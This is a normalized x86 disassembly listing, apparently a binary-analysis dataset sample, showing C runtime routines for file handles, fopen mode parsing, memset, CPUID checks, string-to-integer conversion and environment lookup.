mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_41b7bf
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_420b79
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rw-data ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_41b886
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41b5ae
pop ecx
cmp eax 0xffffffff
je r-xdata
xor edi edi
mov eax [ rw-data ]
cmp esi 0x1
jne r-xdata
xor eax eax
push edi
call sub_4119e1
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp esi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push esi
call sub_41b5ae
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_41b5ae
push 0x1
mov edi eax
call sub_41b5ae
pop ecx
pop ecx
cmp eax edi
je r-xdata
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push esi
call sub_41b528
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
pop ecx
mov [ eax + esi + 0x4 ] 0x0
test edi edi
je r-xdata
sub_41b922
push 0x10
push r--data
call sub_4183f0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_41b886
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41b9e5
mov eax [ ebp - 0x1c ]
sub_41b9ef
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_4121b5
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_41ba20
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
cmp [ esi ] di
jne r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
movzx eax ax
cmp eax 0x53
jg r-xdata
xor ecx ecx
inc ecx
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
je r-xdata
mov ebx 0x301
jmp r-xdata
call sub_4119bb
push edi
push edi
push edi
push edi
push edi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
push 0x180
push [ ebp + 0x10 ]
lea eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x8 ]
push eax
call sub_422d71
add esp 0x14
test eax eax
jne r-xdata
jmp r-xdata
sub eax 0x54
je r-xdata
je r-xdata
or [ ebp - 0x4 ] 0x2
pop edi
pop esi
pop ebx
leave
retn
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
inc [ rw-data ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] edi
mov [ eax ] edi
mov [ eax + 0x8 ] edi
mov [ eax + 0x1c ] edi
mov [ eax + 0x10 ] ecx
cmp [ esi ] 0x20
je r-xdata
mov eax 0x1000
test eax ebx
je r-xdata
sub eax 0xe
je r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
sub eax 0x20
je r-xdata
inc esi
inc esi
push 0x3
push esi
push r--data
call sub_4155ce
add esp 0xc
test eax eax
jne r-xdata
or ebx eax
xor ecx ecx
jmp r-xdata
test ebx 0xc000
jne r-xdata
dec eax
je r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x20
jmp r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp ax di
jne r-xdata
sub eax 0xb
je r-xdata
push 0x20
add esi 0x6
pop eax
jmp r-xdata
cmp ecx edi
je r-xdata
or ebx 0x8000
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0xb
je r-xdata
test bl 0x2
jne r-xdata
dec eax
je r-xdata
cmp [ esi ] ax
je r-xdata
or [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] 0x1
jmp r-xdata
cmp [ ebp - 0xc ] edi
jne r-xdata
sub eax 0x6
jne r-xdata
mov eax [ ebp - 0x4 ]
and ebx 0xfffffffe
and eax 0xfffffffc
or ebx 0x2
or eax 0x80
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
sub eax 0x18
je r-xdata
inc esi
inc esi
cmp [ esi ] 0x3d
jne r-xdata
and [ ebp - 0x4 ] 0xffffbfff
mov [ ebp - 0xc ] 0x1
jmp r-xdata
test ebx 0xc000
jne r-xdata
test bl 0x40
jne r-xdata
sub eax 0xa
je r-xdata
inc esi
inc esi
cmp [ esi ] ax
je r-xdata
or ebx edx
jmp r-xdata
or ebx 0x40
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x4
jne r-xdata
push 0x5
push r--data
push esi
call sub_41617d
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] edi
jne r-xdata
push 0x8
push r--data
push esi
call sub_41617d
add esp 0xc
test eax eax
jne r-xdata
add esi 0xa
or ebx 0x40000
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
or ebx 0x10
jmp r-xdata
push 0x7
push r--data
push esi
call sub_41617d
add esp 0xc
test eax eax
jne r-xdata
add esi 0x10
or ebx 0x20000
jmp r-xdata
add esi 0xe
or ebx 0x10000
jmp r-xdata
sub_41bcd4
push 0x10
push r--data
call sub_4183f0
xor ebx ebx
xor edi edi
mov [ ebp - 0x1c ] edi
push 0x1
call sub_419f99
pop ecx
mov [ ebp - 0x4 ] ebx
xor esi esi
cmp edi ebx
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] ebx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41be03
mov eax edi
call sub_418435
retn
and [ edi + 0xc ] 0x8000
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi ] ebx
mov [ edi + 0x1c ] ebx
or [ edi + 0x10 ] 0xffffffff
shl esi 0x2
push 0x38
call sub_418672
pop ecx
mov ecx [ rw-data ]
mov [ esi + ecx ] eax
mov eax [ rw-data ]
add eax esi
cmp [ eax ] ebx
je r-xdata
mov eax [ eax ]
mov eax [ eax + 0xc ]
test al 0x83
jne r-xdata
push 0xfa0
mov eax [ eax ]
add eax 0x20
push eax
call sub_420b79
pop ecx
pop ecx
test eax eax
mov eax [ rw-data ]
jne r-xdata
inc esi
jmp r-xdata
test eax 0x8000
jne r-xdata
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
mov eax [ rw-data ]
mov edi [ esi + eax ]
mov [ ebp - 0x1c ] edi
mov [ edi + 0xc ] ebx
push [ esi + eax ]
call sub_4121b5
pop ecx
mov eax [ rw-data ]
mov [ esi + eax ] ebx
jmp r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
lea eax [ esi - 0x3 ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_413727
pop ecx
pop ecx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
lea eax [ esi + 0x10 ]
push eax
call sub_419ed6
pop ecx
test eax eax
je r-xdata
mov edi eax
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
push esi
call sub_413795
pop ecx
pop ecx
sub_41be0c
push ebx
push esi
push edi
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x18 ]
push ebp
push edx
push eax
push ecx
push ecx
push sub_41be9c
push [ fs : 0x0 ]
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8 ] eax
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edx [ esp + 0x34 ]
cmp edx 0xfffffffe
je r-xdata
lea esi [ esi + esi * 2 ]
lea ebx [ ebx + esi * 4 + 0x10 ]
mov ecx [ ebx ]
mov [ eax + 0xc ] ecx
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
cmp esi edx
jbe r-xdata
mov eax [ esp + 0x30 ]
mov ebx [ eax + 0x8 ]
mov ecx [ esp + 0x2c ]
xor ebx [ ecx ]
mov esi [ eax + 0xc ]
cmp esi 0xfffffffe
je r-xdata
push 0x101
mov eax [ ebx + 0x8 ]
call sub_422ea9
mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_422ec8
jmp r-xdata
sub_41be9c
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_411f81
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_41be0c
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_41befe
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_41bf2e
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push 0x0
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41bf5f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_41b5ae
pop ecx
cmp eax 0xffffffff
jne r-xdata
push edi
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0xc ]
push eax
call [ SetFilePointer@IAT ]
mov edi eax
cmp edi 0xffffffff
jne r-xdata
call sub_4119bb
mov [ eax ] 0x9
or eax 0xffffffff
jmp r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
pop esi
pop ebp
retn
mov eax esi
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
and esi 0x1f
shl esi 0x6
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax edi
push eax
call sub_4119e1
pop ecx
or eax 0xffffffff
jmp r-xdata
test eax eax
je r-xdata
pop edi
sub_41bfd4
push 0x10
push r--data
call sub_4183f0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_4119ce
and [ eax ] 0x0
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
call sub_4119bb
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_41897d
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_418435
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_41b625
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_4119bb
mov [ eax ] 0x9
call sub_4119ce
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_41bf5f
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41c0a6
mov eax [ ebp - 0x1c ]
sub_41c0cd
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
test eax eax
mov eax [ ebx + 0x4 ]
push edi
je r-xdata
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
and [ esi + 0x4 ] 0x0
jmp r-xdata
push eax
call sub_412e40
mov edi eax
inc edi
push edi
call sub_412584
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push [ ebx + 0x4 ]
push edi
push eax
call sub_41cf11
add esp 0xc
jmp r-xdata
sub_41c14d
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c12a
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41226d
pop ecx
sub_41c17e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_41c16e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_41226d
pop ecx
sub_41c19f
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_41c1eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_41b3c1
push eax
call sub_421df6
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
call sub_41360f
add eax 0x20
cmp esi eax
jne r-xdata
call sub_41360f
add eax 0x40
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
push ebx
push edi
lea edi [ eax * 4 + rw-data ]
cmp [ edi ] 0x0
mov ebx 0x1000
jne r-xdata
mov edi [ edi ]
mov [ esi + 0x8 ] edi
mov [ esi ] edi
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_418672
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
retn
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_41c287
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_415bbb
and [ esi + 0xc ] 0xffffeeff
and [ esi + 0x18 ] 0x0
and [ esi ] 0x0
and [ esi + 0x8 ] 0x0
pop ecx
sub_41c2bb
push ebp
mov ebp esp
sub esp 0x4
mov [ ebp - 0x4 ] edi
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
shr ecx 0x7
pxor xmm0 xmm0
jmp r-xdata
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm0
movdqa [ edi + 0x20 ] xmm0
movdqa [ edi + 0x30 ] xmm0
movdqa [ edi + 0x40 ] xmm0
movdqa [ edi + 0x50 ] xmm0
movdqa [ edi + 0x60 ] xmm0
movdqa [ edi + 0x70 ] xmm0
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_41c312
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] edi
mov eax [ ebp + 0x8 ]
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
test edi edi
jne r-xdata
neg edi
add edi 0x10
mov [ ebp - 0x10 ] edi
xor eax eax
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
[ edi ]
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
add ecx eax
sub edx eax
push edx
push 0x0
push ecx
call sub_41c312
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
and edx 0x7f
mov [ ebp - 0xc ] edx
cmp ecx edx
je r-xdata
test edx edx
je r-xdata
sub ecx edx
push ecx
push eax
call sub_41c2bb
add esp 0x8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0xc ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
add eax [ ebp + 0x10 ]
sub eax edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov edi [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
[ edi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_41c3f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_41c3a1
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_41c460
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_415547
mov eax [ ebp - 0x14 ]
mov ecx [ eax + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov edx 0x100
cmp [ ebp + 0x8 ] dx
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x61 ]
cmp cx 0x19
ja r-xdata
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push 0x1
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push 0x200
push ecx
lea eax [ ebp - 0x14 ]
push eax
call sub_42029f
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_42000d
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0xffffffe0
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xd0 ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_41c528
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x30 ]
call sub_415547
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
xor esi esi
cmp eax esi
je r-xdata
cmp ebx esi
jne r-xdata
mov [ eax ] ebx
cmp [ ebp + 0x14 ] esi
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
cmp [ ebp - 0x24 ] 0x0
je r-xdata
push edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] esi
movzx esi [ ebx ]
lea edi [ ebx + 0x2 ]
jmp r-xdata
cmp [ ebp + 0x14 ] 0x2
jl r-xdata
xor eax eax
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x30 ]
push eax
push 0x8
push esi
call sub_42000d
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x24
jg r-xdata
pop esi
pop ebx
leave
retn
movzx esi [ edi ]
inc edi
inc edi
cmp si 0x2d
jne r-xdata
cmp si 0x2b
jne r-xdata
or [ ebp + 0x18 ] 0x2
jmp r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
jl r-xdata
movzx esi [ edi ]
inc edi
inc edi
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0x1
je r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov [ eax ] ebx
cmp eax 0x24
jg r-xdata
xor eax eax
xor edx edx
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x10
pop ebx
test eax eax
jne r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
push esi
call sub_41fe32
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
cdq
push edx
push eax
push 0xffffffff
push 0xffffffff
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] edx
call sub_422180
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
push esi
call sub_41fe32
pop ecx
test eax eax
jne r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] 0xa
jmp r-xdata
cmp ebx [ ebp + 0x14 ]
jae r-xdata
push 0x41
pop eax
cmp ax si
ja r-xdata
movzx eax [ edi ]
cmp ax 0x78
je r-xdata
mov [ ebp + 0x14 ] ebx
cmp ax 0x58
je r-xdata
mov eax [ ebp + 0x18 ]
dec edi
dec edi
test al 0x8
jne r-xdata
mov ecx [ ebp - 0x4 ]
or [ ebp + 0x18 ] 0x8
cmp ecx [ ebp - 0xc ]
jb r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
ja r-xdata
cmp si 0x5a
jbe r-xdata
inc edi
inc edi
movzx esi [ edi ]
inc edi
inc edi
cmp ax 0x58
jne r-xdata
mov [ ebp + 0x14 ] 0x8
jmp r-xdata
mov esi 0x7fffffff
mov ebx 0x80000000
test al 0x4
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] eax
je r-xdata
push ecx
push [ ebp - 0x8 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call sub_421c80
xor ecx ecx
add eax ebx
adc edx ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
ja r-xdata
lea eax [ esi - 0x61 ]
cmp ax 0x19
movzx eax si
ja r-xdata
call sub_4119bb
test [ ebp + 0x18 ] 0x1
mov [ eax ] 0x22
je r-xdata
test al 0x1
jne r-xdata
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edi [ ebp + 0xc ]
push esi
call sub_41fe32
mov ebx eax
pop ecx
cmp ebx 0xffffffff
jne r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x10 ]
jb r-xdata
lea ebx [ eax - 0x37 ]
sub eax 0x20
test [ ebp + 0x18 ] 0x2
je r-xdata
or [ ebp - 0x8 ] 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
and eax 0x2
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx [ ebp - 0xc ]
jne r-xdata
or [ ebp - 0x8 ] 0xffffffff
mov [ ebp - 0x4 ] esi
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] ebx
jmp r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] ebx
ja r-xdata
movzx esi [ edi ]
inc edi
inc edi
jmp r-xdata
xor eax eax
cmp eax [ ebp - 0x14 ]
jb r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] esi
jb r-xdata
jb r-xdata
ja r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x28 ]
and [ eax + 0x70 ] 0xfffffffd
ja r-xdata
cmp [ ebp - 0x8 ] 0x0
ja r-xdata
cmp ebx [ ebp - 0x18 ]
jbe r-xdata
pop edi
cmp [ ebp - 0x8 ] 0xffffffff
jbe r-xdata
sub_41c7dc
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_41c528
add esp 0x14
pop ebp
retn
sub_41c807
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ rw-data ]
jmp r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
push edi
push eax
push [ ebp + 0x8 ]
call sub_42307e
add esp 0xc
test eax eax
jne r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
neg eax
add esi 0x4
mov eax [ esi ]
movzx eax [ eax + edi * 2 ]
cmp ax 0x3d
je r-xdata
mov eax esi
sub eax [ rw-data ]
sar eax 0x2
jmp r-xdata
test ax ax
je r-xdata
pop esi
pop ebp
retn
sub_41c85d
mov edi edi
push ebp
mov ebp esp
push ecx
push edi
mov edi eax
xor eax eax
mov ecx edi
test edi edi
je r-xdata
pop edi
leave
retn
cmp [ edi ] eax
je r-xdata
push esi
inc eax
push 0x4
push eax
call sub_4186b7
mov esi eax
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
test esi esi
jne r-xdata
add ecx 0x4
inc eax
cmp [ ecx ] 0x0
jne r-xdata
mov eax [ edi ]
test eax eax
jne r-xdata
push 0x9
call sub_416f1d
jmp r-xdata
push eax
call sub_423122
mov [ esi ] eax
add esi 0x4
add edi 0x4
and [ esi ] eax
mov eax [ ebp - 0x4 ]
pop esi
pop ecx
sub_41c8b7
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
mov [ ebp - 0x4 ] esi
cmp eax esi
jne r-xdata
push ebx
mov ebx [ eax ]
push edi
mov [ ebp - 0xc ] ebx
cmp ebx esi
je r-xdata
call sub_4119bb
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_41897d
add esp 0x14
or eax 0xffffffff
jmp r-xdata
call sub_4119bb
mov [ eax ] 0x16
push 0x3d
push ebx
call sub_412cfe
mov edi eax
pop ecx
pop ecx
cmp edi esi
je r-xdata
pop esi
leave
retn
cmp ebx edi
je r-xdata
xor eax eax
cmp [ edi + 0x2 ] si
sete al
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
cmp eax [ rw-data ]
jne r-xdata
cmp eax esi
jne r-xdata
call sub_41c85d
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
cmp eax esi
je r-xdata
mov eax [ rw-data ]
cmp [ ebp + 0xc ] esi
je r-xdata
or eax 0xffffffff
